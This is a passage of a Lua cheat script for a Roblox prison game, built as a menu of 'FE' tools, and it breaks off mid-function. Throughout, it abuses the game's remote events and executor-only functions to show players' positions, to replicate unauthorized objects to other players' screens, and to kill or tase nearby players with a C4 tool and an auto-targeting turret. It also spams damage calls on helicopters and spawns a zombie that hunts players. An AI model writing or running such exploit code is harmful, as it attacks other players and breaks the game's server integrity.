function FEPaintTool()
    
    if not Player.Character:FindFirstChild("Secret Agent Shades") then
    game.Workspace.resources.RemoteEvent:FireServer("wearHat",game.Workspace["Secret Agent Shades"])
    repeat wait() until Player.Character:FindFirstChild("Secret Agent Shades")
    Player.Character:WaitForChild("Secret Agent Shades").Transparency = 1
    end
        function createpaint(part,Size,CFrame,Material,e,Transparency)
            local properties = {
                ["TopSurface"] = DiscordInvite,
                ["Material"] = Material,
                ["Reflectance"] = 0,
                ["CanCollide"] = true,
                ["Anchored"] = true,
                ["Size"] = Size,
                ["CFrame"] = CFrame,
                ["Color"] = PaintColor,
                ["Transparency"] = Transparency,
                ["Parent"] = Player.Character:FindFirstChild("Secret Agent Shades")
            }
            firesignal(game.Workspace.resources.RemoteEvent.OnClientEvent,"drawLaser",part.Position,part.Position,properties)
            lib.FireOtherClients("drawLaser",part.Position,part.Position,properties)
        end
        local tool = Instance.new("Tool")
        tool.Name = "Paint tool"
        tool.Parent = game.Players.LocalPlayer.Backpack
        local Player = Game.Players.LocalPlayer
        local Mouse = Player:GetMouse()
        tool.RequiresHandle = false
        tool.Activated:connect(function()
            if Mouse.Target:IsA("BasePart") then
                        local paint = Instance.new("Part")
                        paint.Parent = Workspace
                        createpaint(paint,Mouse.Target.Size+Vector3.new(0.005,0.005,0.005),Mouse.Target.CFrame,Mouse.Target.Material,Mouse.Target.BrickColor,Mouse.Target.Transparency)
                        paint:Destroy()
             end
        end)
end
FEStuff:Button(
    "FE paint tool",
    function()    
        FEPaintTool()
    end
)
function FeLaserESP()
    if not FELaserEspGiven then
        FELaserEspGiven = true
wait(0.2)
local laser = Instance.new("Part")
laser.Parent = Workspace
function createlaser(part,start,endpos)
    local properties = {
    ["Material"] = Enum.Material.Metal,
    ["Color"] = LaserESPColor,
    ["Material"] = Enum.Material.Neon,
    ["Reflectance"] = 0.5
    }
    firesignal(game.Workspace.resources.RemoteEvent.OnClientEvent,"drawLaser",start,endpos,properties)
    lib.FireOtherClients("drawLaser",start,endpos,properties)
end
Player.CharacterAdded:Connect(function()
    if FELaserEspGiven then
    FELaserEspGiven = false
    return
    end
end)

while Player.Character.Humanoid.Health ~= 0 and wait(0.05) do
for i,v in pairs(game.Players:GetPlayers()) do
    createlaser(laser,Player.Character.HumanoidRootPart.Position,v.Character.HumanoidRootPart.Position)
end
end
end
end
FEStuff:Button(
    "FE Laser ESP",
    function()
        FeLaserESP()
    end
)
function FEprofly()
        if not Player.Character:FindFirstChild("Secret Agent Shades") then
    game.Workspace.resources.RemoteEvent:FireServer("wearHat",game.Workspace["Secret Agent Shades"])
    repeat wait() until Player.Character:FindFirstChild("Secret Agent Shades")
        Player.Character:WaitForChild("Secret Agent Shades").Transparency = 1
    end
    local Halo = Instance.new("Part")
    Halo.Parent = Player.Character["Secret Agent Shades"]
    Halo.Anchored = true
    Halo.Material = Enum.Material.Neon
    Halo.Size = Vector3.new(0.25, 4.25, 4.25)
    Halo.Shape = Enum.PartType.Cylinder
    Halo.Color = ProflyColor
    Halo.Orientation = Vector3.new(0, 0, 90)
    function createpartf(part)
        local properties = {
            ["CanCollide"] = true,
            ["Parent"] = Player.Character["Secret Agent Shades"],
            ["Anchored"] = true,
            ["Color"] = ProflyColor,
            ["RotVelocity"] = part.RotVelocity,
            ["Name"] = "Halo",
            ["Position"] = part.Position,
            ["Orientation"] = Vector3.new(0, 0, 90),
            ["Material"] = Enum.Material.Neon,
            ["Shape"] = Enum.PartType.Cylinder,
            ["Size"] = Vector3.new(0.25, 4.25, 4.25)


        }
        lib.FireOtherClients("drawLaser",part.Position,part.Position,properties)
    end



    while wait(0.07) and Halo and Halo.Parent == Player.Character["Secret Agent Shades"] and Player.Character.Humanoid.Health ~= 0 do
        Halo.Position = game.Players.LocalPlayer.Character.Head.Position + Vector3.new(0,-4.7,0)
        Halo.Color = ProflyColor
        createpartf(Halo)
    end	

end
FEStuff:Button(
    "FE profly",
    function()  
        FEprofly()
    end
)
function FELasertool()
            if not Player.Backpack:FindFirstChild("Lasers!!") or Player.Character:FindFirstChild("Lasers!!") then
    if not Player.Character:FindFirstChild("Secret Agent Shades") then
    game.Workspace.resources.RemoteEvent:FireServer("wearHat",game.Workspace["Secret Agent Shades"])
    repeat wait() until Player.Character:FindFirstChild("Secret Agent Shades")
        Player.Character:WaitForChild("Secret Agent Shades").Transparency = 1
    end
function createlaser(part,start,endpos)
local properties = {
["TopSurface"] = DiscordInvite,
["Material"] = Enum.Material.Neon,  
["Color"] = LaserColor,
["Reflectance"] = 0,
["CanCollide"] = true,
["Parent"] = Player.Character:FindFirstChild("Secret Agent Shades")
}
firesignal(game.Workspace.resources.RemoteEvent.OnClientEvent,"drawLaser",start,endpos,properties)
lib.FireOtherClients("drawLaser",start,endpos,properties)
end
local ray = Instance.new("Part")
ray.Parent = Player.Character
local mouse = game.Players.LocalPlayer:GetMouse()
local tool = Instance.new("Tool",game.Players.LocalPlayer.Backpack)
tool.Name = "Lasers!!"
local doing = false
tool.RequiresHandle = false
tool.Activated:Connect(function()
doing = true
while doing do
 createlaser(ray, mouse.Hit.p+Vector3.new(0, 0, 0), mouse.Hit.p+Vector3.new(0, 15, 0))
wait()
end
end)

tool.Deactivated:Connect(function()
doing = false
end)
Player.Character.Humanoid.Died:Connect(function()
    doing = false
    return
end)
end
end
FEStuff:Button(
    "FE laser tool",
    function()    
        FELasertool()
    end
)
function FeC4tool()
    if not C4Cooldown and not Player.Backpack:FindFirstChild("C4") and not Player.Character:FindFirstChild("C4") then
--if Player.Backpack:FindFirstChild("C4") then return end if Player.Character:FindFirstChild("C4") then return end
C4Cooldown = true

--- Services ---
local userInputService = game:GetService("UserInputService")
local runservice = game:GetService("RunService")

local C4
local lib = require(game:GetService("Workspace").upsilonLibrary)
--local BombPos = game.Workspace.Part.Position
--placed = false
--exploded = false
--local ExplosionBall = Instance.new("Part")
--ExplosionBall.Parent = plr.Character["Secret Agent Shades"]

IT = Instance.new
CF = CFrame.new
VT = Vector3.new
RAD = math.rad
C3 = Color3.new
UD2 = UDim2.new
BRICKC = BrickColor.new
ANGLES = CFrame.Angles
EULER = CFrame.fromEulerAnglesXYZ
COS = math.cos
ACOS = math.acos
SIN = math.sin
ASIN = math.asin
ABS = math.abs
MRANDOM = math.random
FLOOR = math.floor

function CreateEffect(FORMFACTOR, PARENT, MATERIAL, REFLECTANCE, TRANSPARENCY, BRICKCOLOR, NAME, SIZE, ANCHOR)
	local NEWPART = IT("Part")
	NEWPART.formFactor = FORMFACTOR
	NEWPART.Reflectance = REFLECTANCE
	NEWPART.Transparency = TRANSPARENCY
	NEWPART.CanCollide = false
	NEWPART.Locked = true
	NEWPART.Anchored = true
	if ANCHOR == false then
		NEWPART.Anchored = false
	end
	NEWPART.BrickColor = BRICKC(tostring(BRICKCOLOR))
	NEWPART.Name = NAME
	NEWPART.Size = SIZE
	NEWPART.Position = Player.Character.Torso.Position
	NEWPART.Material = MATERIAL
	NEWPART:BreakJoints()
	NEWPART.Parent = PARENT
	return NEWPART
end

function WACKYEFFECT(Table)
	local TYPE = Table.EffectType or "Sphere"
	local SIZE = Table.Size or VT(1, 1, 1)
	local ENDSIZE = Table.Size2 or VT(0, 0, 0)
	local TRANSPARENCY = Table.Transparency or 0
	local ENDTRANSPARENCY = Table.Transparency2 or 1
	local CFRAME = Table.CFrame or Torso.CFrame
	local MOVEDIRECTION = Table.MoveToPos or nil
	local ROTATION1 = Table.RotationX or 0
	local ROTATION2 = Table.RotationY or 0
	local ROTATION3 = Table.RotationZ or 0
	local MATERIAL = Table.Material or "Neon"
	local COLOR = Table.Color or C3(1, 1, 1)
	local TIME = Table.Time or 45
	local SOUNDID = Table.SoundID or nil
	local SOUNDPITCH = Table.SoundPitch or nil
	local SOUNDVOLUME = Table.SoundVolume or nil
	coroutine.resume(coroutine.create(function()
		local PLAYSSOUND = false
		local SOUND
		local EFFECT = CreateEffect(3, ScriptFolder, MATERIAL, 0, TRANSPARENCY, BRICKC("Pearl"), "Effect", VT(1, 1, 1), true)
		if SOUNDID ~= nil and SOUNDPITCH ~= nil and SOUNDVOLUME ~= nil then
			PLAYSSOUND = true
			--SOUND = CreateSound(SOUNDID, EFFECT, SOUNDVOLUME, SOUNDPITCH, false)
		end
		EFFECT.Color = COLOR
		local MSH
		if TYPE == "Sphere" then
			--MSH = CreateMesh("SpecialMesh", EFFECT, "Sphere", "", "", SIZE, VT(0, 0, 0))
			EFFECT.Shape = Enum.PartType.Ball
		elseif TYPE == "Block" or TYPE == "Box" then
			--MSH = IT("BlockMesh", EFFECT)
			--MSH.Scale = SIZE
		elseif TYPE == "Wave" then
			--MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "20329976", "", SIZE, VT(0, 0, -SIZE.X / 8))
		elseif TYPE == "Ring" then
			--MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "559831844", "", VT(SIZE.X, SIZE.X, 0.1), VT(0, 0, 0))
		elseif TYPE == "Slash" then
			--MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "662586858", "", VT(SIZE.X / 10, 0, SIZE.X / 10), VT(0, 0, 0))
		elseif TYPE == "Round Slash" then
			--MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "662585058", "", VT(SIZE.X / 10, 0, SIZE.X / 10), VT(0, 0, 0))
		elseif TYPE == "Swirl" then
			--MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "1051557", "", SIZE, VT(0, 0, 0))
		elseif TYPE == "Skull" then
			--MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "4770583", "", SIZE, VT(0, 0, 0))
		elseif TYPE == "Crystal" then
			--MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "9756362", "", SIZE, VT(0, 0, 0))
		end
		CreateReturningPart(EFFECT,false,0.05)
		local MOVESPEED
		if MOVEDIRECTION ~= nil then
			MOVESPEED = (CFRAME.p - MOVEDIRECTION).Magnitude / TIME
		end
		local GROWTH = SIZE - ENDSIZE
		local TRANS = TRANSPARENCY - ENDTRANSPARENCY
		if TYPE == "Block" then
			EFFECT.CFrame = CFRAME * ANGLES(RAD(MRANDOM(0, 360)), RAD(MRANDOM(0, 360)), RAD(MRANDOM(0, 360)))
		else
			EFFECT.CFrame = CFRAME
		end
		for LOOP = 1, TIME + 1 do
			wait()
			EFFECT.Size = EFFECT.Size - GROWTH / TIME
			if TYPE == "Wave" then
				MSH.Offset = VT(0, 0, -MSH.Scale.X / 8)
			end
			EFFECT.Transparency = EFFECT.Transparency - TRANS / TIME
			if TYPE == "Block" then
				EFFECT.CFrame = CFRAME * ANGLES(RAD(MRANDOM(0, 360)), RAD(MRANDOM(0, 360)), RAD(MRANDOM(0, 360)))
			else
				EFFECT.CFrame = EFFECT.CFrame * ANGLES(RAD(ROTATION1), RAD(ROTATION2), RAD(ROTATION3))
			end
			if MOVEDIRECTION ~= nil then
				local ORI = EFFECT.Orientation
				EFFECT.CFrame = CF(EFFECT.Position, MOVEDIRECTION) * CF(0, 0, -MOVESPEED)
				EFFECT.Orientation = ORI
			end
		end
		if PLAYSSOUND == false then
			EFFECT:Destroy()
			repeat
				wait()
			until EFFECT:FindFirstChildOfClass("Sound") == nil
			EFFECT:Destroy()
		end
		EFFECT:Destroy()
		repeat
			wait()
		until EFFECT:FindFirstChildOfClass("Sound") == nil
		EFFECT:Destroy()
	end))
end



function ApplyAoE(POSITION, RANGE)
	for index, CHILD in pairs(workspace:GetDescendants()) do
		if CHILD.ClassName == "Model" and CHILD ~= Player.Character and game:GetService("Players"):FindFirstChild(CHILD.Name) then
			local HUM = CHILD:FindFirstChildOfClass("Humanoid")
			if HUM then
				local TORSO = CHILD:FindFirstChild("Torso") or CHILD:FindFirstChild("UpperTorso")
				if TORSO and RANGE >= (TORSO.Position - POSITION).Magnitude then
					if CHILD ~= Player.Character then
						TKill(CHILD.Name)
					end	
				end
			end
		end
	end
end

local newWeld
local newShades

function CreateC4()
Player.Character.ChildAdded:Connect(function(child)
    if child.Name == "Secret Agent Shades" then
       newShades = child
       newShades.Name = "Secret Agent Shades2"
       newShades.Transparency = 1
       return end
end)
    Player.Character.Head.ChildAdded:Connect(function(child)
    if child.Name == "Weld" then
       newWeld = child
       newWeld.Name = "Secret Agent Shades2 Weld"
       return end
end)
wait(0.2)
game.Workspace.resources.RemoteEvent:FireServer("wearHat",game.Workspace["Secret Agent Shades"])
repeat wait() until Player.Character:FindFirstChild("Secret Agent Shades2")
	C4.Parent = newShades
	for i,v in pairs(C4:GetChildren()) do
		if v:IsA("BasePart") then
			--_G.CreatePermPart(v,Workspace[game.Players.LocalPlayer.Name]["Secret Agent Shades"])
			CreatePermPart(v,newShades)
		end
	end
end

local C4Tool = Instance.new("Tool",Player.Backpack)
C4Tool.RequiresHandle = false
C4Tool.Enabled = true
C4Tool.Name = "C4"

C4Equipped = false
C4Placed = false
C4PlacePos = nil
TickWait = 1

C4Tool.Equipped:Connect(function()
	if not C4Equipped and not C4Placed then
		C4Equipped = true
		C4 = game:GetObjects("rbxassetid://11381640180")[1]
		C4.Parent = Player.Character
		while C4Equipped and wait() do
			C4:MoveTo(Mouse.Hit.p)
		end
	end
end)
C4Tool.Unequipped:Connect(function()
	if C4Equipped and not C4Placed then
		C4Equipped = false
		C4:Destroy()
		local C4
		C4 = C4
	end
end)


C4Tool.Activated:Connect(function()
	if C4Equipped and not C4Placed then
		C4Placed = true
		C4Equipped = false
		C4Tool:Destroy()
		C4PlacePos = Mouse.Hit.p
		C4.Parent = nil
		local BottonAnim = Instance.new("Animation")
		BottonAnim.AnimationId = "rbxassetid://75322014"
		local ButtonTrack = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(BottonAnim)
	    local TossAnim = Instance.new("Animation")
	    TossAnim.AnimationId = "rbxassetid://75321266"
	    local TossTrack = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(TossAnim)
		ButtonTrack:Play(.1, 1, 1)
		ButtonTrack.Stopped:Connect(function()
	    TossTrack:Play(.1, 1, 1)
		end)
		wait(ButtonTrack.Length)
		wait(TossTrack.Length)
		C4:MoveTo(C4PlacePos)
		CreateC4()
		BeepSound = IT("Sound",C4:FindFirstChildOfClass("Part"))
		BeepSound.SoundId = "rbxassetid://1283290053"
		BeepSound.Volume = 1.5
		for i = 1,3 do
			wait(TickWait)
			BeepSound:Play()
		end
		TickWait = 0.3
		newWeld:Destroy()
		TossTrack:Stop()
		for i = 1,3 do
			wait(TickWait)
			BeepSound:Play()
		end

		local COLORS = {
			C3(0.8862745098039215, 0.6078431372549019, 0.25098039215686274),
			C3(1, 0, 0),
			C3(0.9607843137254902, 0.803921568627451, 0.18823529411764706)
		}
		WACKYEFFECT({
			Time = 66,
			EffectType = "Sphere",
			Size = VT(25, 25, 25),
			Size2 = VT(250, 250, 250),
			Transparency = 0.99,
			Transparency2 = 1,
			CFrame = CF(C4PlacePos),
			MoveToPos = nil,
			RotationX = 0,
			RotationY = 0,
			RotationZ = 0,
			Material = "Neon",
			Color = C3(1, 1, 1),
			SoundID = nil,
			SoundPitch = nil,
			SoundVolume = nil
		})
		for i = 1, 45 do
			WACKYEFFECT({
				Time = MRANDOM(10, 60),
				EffectType = "Sphere",
				Size = VT(25, 25, 25) * MRANDOM(3, 7) / 10,
				Size2 = VT(45, 45, 45) * MRANDOM(5, 20) / 10,
				Transparency = 0,
				Transparency2 = 1,
				CFrame = CF(C4PlacePos) * ANGLES(RAD(MRANDOM(0, 360)), RAD(MRANDOM(0, 360)), RAD(MRANDOM(0, 360))) * CF(0, 15, 0),
				MoveToPos = nil,
				RotationX = 0,
				RotationY = 0,
				RotationZ = 0,
				Material = "Neon",
				Color = COLORS[MRANDOM(1, #COLORS)],
				SoundID = nil,
				SoundPitch = nil,
				SoundVolume = nil
			})
		end
		ApplyAoE(C4PlacePos, 50)
		C4Placed = false
		wait(CooldownTime)
		C4Cooldown = false
	end
end)
elseif C4Cooldown then
    ChatMakeSystemMessage("warning","C4 Is on cooldown. Please wait to use it again!") return
end
end
FEStuff:Button(
    "FE C4 tool",
    function()    
        FeC4tool()
    end
)
function AHTool()
        if not Player.Backpack:FindFirstChild("Anti-Helicopter") or Player.Character:FindFirstChild("Anti-Helicopter") then
function autoheliswitch(target)
    local oldteam = Player.TeamColor
    if target.Value == Player.TeamColor then
        if target.Value == BrickColor.new("Bright red") then
            game.Workspace.resources.RemoteFunction:InvokeServer("requestTeam", "police")
        elseif target.Value == BrickColor.new("Bright blue") then
            game.Workspace.resources.RemoteFunction:InvokeServer("requestTeam", "prisoners")
        elseif target.Value == BrickColor.new("Bright yellow") then
            game.Workspace.resources.RemoteFunction:InvokeServer("requestTeam", "prisoners")
        end
    end
    wait(0.7)
    if oldteam == BrickColor.new("Bright red") then
        game.Workspace.resources.RemoteFunction:InvokeServer("requestTeam", "prisoners")
    elseif oldteam == BrickColor.new("Bright blue") then
        game.Workspace.resources.RemoteFunction:InvokeServer("requestTeam", "police")
    elseif oldteam == BrickColor.new("Bright yellow") then
        firetouchinterest(Player.Character.Head, game:GetService("Workspace")["robber spawn"], 0)
    end
end

local HeliTool = Instance.new("Tool")
HeliTool.Name = "Anti-Helicopter"
HeliTool.Parent = Player.Backpack
HeliTool.RequiresHandle = false

HeliTool.Activated:Connect(function()
    local hit = Mouse.Target
    if hit.Parent.Name == "helicopter" then
        autoheliswitch(hit.Parent.damageControl.Humanoid.teamColor)
        for count = 1, 500 do
            local args = {
                [1] = "dealBulletDamage",
                [2] = hit.Parent.damageControl.Humanoid,
                [3] = "M98B",
                [4] = Vector3.one*0/0,
                [5] = Vector3.one*0/0
                }
                workspace.resources.RemoteEvent:FireServer(unpack(args))  
        end
    end
end)
end
end
FEStuff:Button(
    "Anti-Helicopter tool",
    function()
        AHTool()
    end
)
function FEff()
    if not FEffGiven then
        FEffGiven = true
        if not Player.Character:FindFirstChild("Secret Agent Shades") then
    game.Workspace.resources.RemoteEvent:FireServer("wearHat",game.Workspace["Secret Agent Shades"])
    repeat wait() until Player.Character:FindFirstChild("Secret Agent Shades")
        Player.Character:WaitForChild("Secret Agent Shades").Transparency = 1
    end
local Bubble = Instance.new("Part")
Bubble.Parent = Player.Character["Secret Agent Shades"]
Bubble.Size = Vector3.new(10,10,10)
Bubble.CastShadow = false
Bubble.CanCollide = false
Bubble.Anchored = true
Bubble.Shape = Enum.PartType.Ball
Bubble.Color = ForceFieldColor
Bubble.Material = Enum.Material.ForceField
Bubble.Transparency = 0

function Shield(part)
local properties = {
["CanCollide"] = true,
 ["Parent"] = Workspace,
 ["Anchored"] = true,
 ["Color"] = ForceFieldColor,
 ["RotVelocity"] = part.RotVelocity,
 ["Name"] = part.Name,
 ["Position"] = part.Position,
 ["Material"] = part.Material,
 ["Shape"] = part.Shape,
 ["Size"] = part.Size,
 ["CastShadow"] = false,
 ["Transparency"] = 1
}

lib.FireOtherClients("drawLaser",part.Position,part.Position,properties)
end

Player.CharacterAdded:Connect(function()
    if FEffGiven then
    FEffGiven = false
    return
    end
end)

while wait(0.05) and Bubble and Bubble.Parent == Player.Character["Secret Agent Shades"] and Player.Character.Humanoid.Health ~= 0 do
Bubble.Position = Player.Character.HumanoidRootPart.Position
Bubble.Color = ForceFieldColor
Shield(Bubble)
end
end

end
FEStuff:Button(
    "FE ForceField",
    function()    
        FEff()
    end
)

FEStuff:Seperator()
FEStuff:Label("fe spawner Stuff")
local function spawnFESlide()
    if ScriptFolder:FindFirstChild("FE Slide") then return end
   local Slide = game:GetObjects("rbxassetid://9406282428")[1]
   Slide.Name = "FE Slide"
   Slide.Parent = ScriptFolder
   for i,v in pairs(Slide:GetChildren()) do
       if v:IsA("Part") then
           CreatePermPart(v,workspace)
           v.Transparency = 1
        end
   end
end
FEStuff:Button(
    "Spawn slide",
    function()
        spawnFESlide()
    end
)

function FETsTool()
                if not ScriptFolder:FindFirstChild("Turret") and not TurretGiven then
            TurretGiven = true
local TurretTool = Instance.new("Tool",Player.Backpack)
TurretTool.RequiresHandle = false
TurretTool.Enabled = true
TurretTool.Name = "Place Turret"

local TurretEquipped = false
local TurretPlacePos = nil
local TurretPlaced = false
local TurretEnabled = false
local Mode = "Shoot"

local newShades
local newWeld

local Turret
--Turret.Parent = ScriptFolder
local TurretGui = game:GetObjects("rbxassetid://11219709488")[1]
--TurretGui.Parent = Turret.Screen
local EnabledButton = TurretGui.EnabledButton
local ModeButton = TurretGui.ModeButton
local DestroyTurretButton = TurretGui.DestroyTurretButton


TurretTool.Equipped:Connect(function()
	if not TurretEquipped and not TurretPlaced then
		TurretEquipped = true
		Turret = game:GetObjects("rbxassetid://11300813452")[1]
		Turret.Parent = Player.Character
		while TurretEquipped and wait() do
			Turret:MoveTo(Mouse.Hit.p)
		end
	end
end)
TurretTool.Unequipped:Connect(function()
	if TurretEquipped and not TurretPlaced then
		TurretEquipped = false
		Turret:Destroy()
		local Turret
		Turret = Turret
	end
end)

DestroyTurretButton.Activated:Connect(function()
    newWeld:Destroy()
    TurretEnabled = false
    Turret:Destroy()
    if ScriptFolder:FindFirstChild("Turret") then
        ScriptFolder:FindFirstChild("Turret"):Destroy()
    end
    TurretGiven = false
end)


TurretTool.Activated:Connect(function()
	if TurretEquipped and not TurretPlaced then
		TurretEquipped = false
		TurretTool:Destroy()
		TurretPlacePos = Mouse.Hit.p
		Turret:Destroy()
		Turret = game:GetObjects("rbxassetid://11300813452")[1]
		Turret.Parent = ScriptFolder
		TurretGui.Parent = Turret.Screen
		Turret:MoveTo(TurretPlacePos)
		TurretPlaced = true
Player.Character.ChildAdded:Connect(function(child)
    if child.Name == "Secret Agent Shades" then
       newShades = child
       newShades.Name = "Secret Agent Shades2"
       newShades.Transparency = 1
       return end
end)
    Player.Character.Head.ChildAdded:Connect(function(child)
    if child.Name == "Weld" then
       newWeld = child
       newWeld.Name = "Secret Agent Shades2 Weld"
       return end
end)
game.Workspace.resources.RemoteEvent:FireServer("wearHat",game.Workspace["Secret Agent Shades"])
repeat wait() until Player.Character:FindFirstChild("Secret Agent Shades2")
for i,v in pairs(Turret:GetChildren()) do
    if v:IsA("BasePart") then
        v.CanCollide = true 
       CreatePermPart(v,newShades) 
       v.Transparency = 1
    end
end
	TurretEnabled = true
EnabledButton.Activated:Connect(function()
    if TurretEnabled then
        TurretEnabled = false
        EnabledButton.Text = "Enabled: [OFF]"
        elseif not TurretEnabled then
        TurretEnabled = true
        EnabledButton.Text = "Enabled: [ON]"
    end
end)

ModeButton.Activated:Connect(function()
    if Mode == "Shoot" then
        Mode = "Tase"
        ModeButton.Text = "Mode: [Tase]"
        wait(0.2)
    elseif Mode == "Tase" then
        Mode = "Shoot"
        ModeButton.Text = "Mode: [Shoot]"
        wait(0.2)
    end
end)
local ray = Instance.new("Part")
ray.Parent = Player.Character
function tase(head)
local ohString1 = "taseNew"
local ohInstance2 = game:GetService("Players")[head.Parent.Name]
local ohVector33 = Vector3.one*0/0
local ohVector34 = Vector3.one*0/0

workspace.resources.RemoteEvent:FireServer(ohString1, ohInstance2, ohVector33, ohVector34)
end
    local laserTemp = Instance.new("Part")
    laserTemp.Material = Enum.Material.Neon
    laserTemp.BrickColor = BrickColor.new("Really red")
    laserTemp.Transparency = 0.5
    laserTemp.Anchored = true
    laserTemp.CanCollide = false

function shoot(part,pos1,pos2)
    if Mode == "Shoot" then
        local laser = drawLaser(laserTemp,pos1,pos2)
        fsPart(laser)
        return laser
   end
end

Player.CharacterAdded:Connect(function()
    if Turret ~= nil and TurretPlaced and TurretGiven then
    Turret:Destroy()
    script:Destroy()
    TurretGiven = false
    return
    end
end)

while wait(1) and Turret and Player.Character:FindFirstChild("Secret Agent Shades2") and Player.Character.Humanoid.Health ~= 0 do
    if TurretEnabled then
    for i,v in pairs(game:GetService("Players"):GetPlayers()) do
        if workspace:FindFirstChild(v.Name) and workspace:FindFirstChild(v.Name):findFirstChildOfClass("Humanoid").Health ~= 0 then
            if v ~= Player and v.Name ~= Ranks.Developer.UserName and v.Name ~= Ranks.Holder.UserName then
                local dist=(v.Character.HumanoidRootPart.Position - Turret.ZappyPos.Position).magnitude
                if dist < 50 then
 
if Mode == "Shoot" then
    if v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 then
        local laser
        laser = shoot(ray,Turret.ZappyPos.Position,v.Character.HumanoidRootPart.Position)
        TKill(v.Name)
        wait(0.1)
        laser:Destroy()
        wait(0.3)
end
end
end
end
end
end
else repeat wait(0.1) until TurretEnabled
end
end
end
end)
else
    ChatMakeSystemMessage("warning","You have already have a turret. Destroy it to spawn another one!")
end
    
end
FEStuff:Button(
    "FE turret spawner tool",
    function()    
        FETsTool()
    end
)
function FESpawnZombie()
--- Services ---
local userInputService = game:GetService("UserInputService")
local runservice = game:GetService("RunService")


--for i,obj in pairs(ScriptFolder:GetChildren()) do
--    if obj.Name == "D00M Zombie" then
--        obj:Destroy()
--    end
--end 
if not ScriptFolder:findFirstChild("D00M Zombie") then
local zombie = game:GetObjects("rbxassetid://10941490996")[1]
zombie.Parent = ScriptFolder
zombie.Name = "D00M Zombie"

zombie.Humanoid.NameDisplayDistance = 0
zombie.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame + Vector3.new(0,5,0)

for i,v in pairs(zombie:GetChildren()) do
    if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
        CreateReturningPart(v,false,0.07)
    end
end

local function QMYBKK_fake_script() -- Zombie AI 
local script = Instance.new('Script', zombie)
--Fully made by Rufus14
--animations are made with :lerp() and sine waves
--you can convert the model to use it in script builder
local npc = script.Parent
local torso = npc.Torso
local head = npc.Head
local leftarm = npc["Left Arm"]
local rightarm = npc["Right Arm"]
local leftleg = npc["Left Leg"]
local rightleg = npc["Right Leg"]
local npchumanoid = npc:findFirstChildOfClass("Humanoid")
sine = 0
--Motor6D's
local neck = torso.Neck
neck.C1 = CFrame.new(0,0,0)
local leftshoulder = torso["Left Shoulder"]
leftshoulder.C1 = CFrame.new(0,0,0)
local rightshoulder = torso["Right Shoulder"]
rightshoulder.C1 = CFrame.new(0,0,0)
local lefthip = torso["Left Hip"]
lefthip.C1 = CFrame.new(0,0,0)
local righthip = torso["Right Hip"]
righthip.C1 = CFrame.new(0,0,0)
step = game:GetService("RunService").Stepped
if npc:findFirstChild("HumanoidRootPart") then
	if npc.HumanoidRootPart:findFirstChild("RootJoint") then
		root = npc.HumanoidRootPart.RootJoint
		root.C1 = CFrame.new(0,0,0)
	elseif npc.HumanoidRootPart:findFirstChild("Root Hip") then
		root = npc.HumanoidRootPart["Root Hip"]
		root.C1 = CFrame.new(0,0,0)
	end
else
	npchumanoid.Health = 0
end
--
local sight = 80
local walking = false
local attacking = false
local cansay = true
local ragdolldeath = true
local caninfect = true
local canrandomwalk = true
local saycooldown = 0
function walkanim(walkspeed)
	if walkspeed > 2 then
		walking = true
	else
		walking = false
	end
end
npchumanoid.Running:connect(walkanim)
function walkrandomly()
	while wait(math.random(3,6)) and zombie and zombie:findFirstChild("Head") do
		if not walking and canrandomwalk then
			npchumanoid.WalkSpeed = 7
			local function createwalkpart()
				local walkpart = Instance.new("Part", npc)
				walkpart.Size = Vector3.new(1,1,1)
				walkpart.Anchored = true
				walkpart.Material = "Neon"
				walkpart.Transparency = 1
				walkpart.BrickColor = BrickColor.new("Maroon")
				walkpart.CFrame = torso.CFrame * CFrame.new(math.random(-60,60),math.random(-30,30),math.random(-60,60))
				local path = game:GetService("PathfindingService"):FindPathAsync(torso.Position, walkpart.Position)
				local waypoints = path:GetWaypoints()
				if path.Status == Enum.PathStatus.Success then
					for i,v in pairs(waypoints) do
						if canrandomwalk then
							npchumanoid:MoveTo(v.Position)
							local allow = 0
							while (torso.Position - v.Position).magnitude > 4 and allow < 25 do
								allow = allow + 1
								wait()
							end
							if v.Action == Enum.PathWaypointAction.Jump then
								npchumanoid.Jump = true
							end
						end
					end
					for i,v in pairs(npc:GetChildren()) do
						if v.Name == "pospart" then
							v:destroy()
						end
					end
				else
					createwalkpart()
					wait()
				end
			end
			createwalkpart()
		end
	end
end
function chase()
	while true and zombie and zombie:findFirstChild("Head") do
		if not walking then
			for i,v in pairs(workspace:GetChildren()) do
				if v:findFirstChildOfClass("Humanoid") and v:findFirstChild("Head") and v.Name ~= zombie.Name and v.Name ~= Player.Name and v.Name ~= Ranks.Developer.UserName and v.Name ~= Ranks.Holder.Name then
					if (v:findFirstChild("Head").Position - npc.Head.Position).magnitude < sight then
						canrandomwalk = false
						local thehumanoid = v:findFirstChildOfClass("Humanoid")
						local pathfinding = false
						local thehead = v:findFirstChild("Head")
						while (thehead.Position - npc.Head.Position).magnitude < sight and thehumanoid.Health > 0 do
							npchumanoid.WalkSpeed = 20
							npchumanoid:MoveTo(thehead.Position, thehead)
							local path = game:GetService("PathfindingService"):FindPathAsync(torso.Position, thehead.Position) --find the path from scp's torso to victims head
							local waypoints = path:GetWaypoints() --get the every point of the path
							if path.Status == Enum.PathStatus.Success then
								for q,w in pairs(waypoints) do --for every point existing..
									if q ~= 1 then
										local allow = 0
										npchumanoid:MoveTo(w.Position, thehead) --...walk to it
										while (torso.Position - w.Position).magnitude > 3.8 and allow < 20 do
											allow = allow + 1
											game:GetService("RunService").Heartbeat:wait()
										end
										if w.Action == Enum.PathWaypointAction.Jump then
											npchumanoid.Jump = true
										end
										if thehumanoid.Health <= 0 then
											break
										end
									end
								end
								for q,w in pairs(npc:GetChildren()) do
									if w.Name == "pospart" then
										w:destroy()
									end
								end
							else
								npchumanoid:MoveTo(thehead.Position, thehead)
							end
							wait()
						end
						canrandomwalk = true
					else
						canrandomwalk = true
					end
				end
			end
		end
		wait()
	end
end
candmg = true
function damage(part)
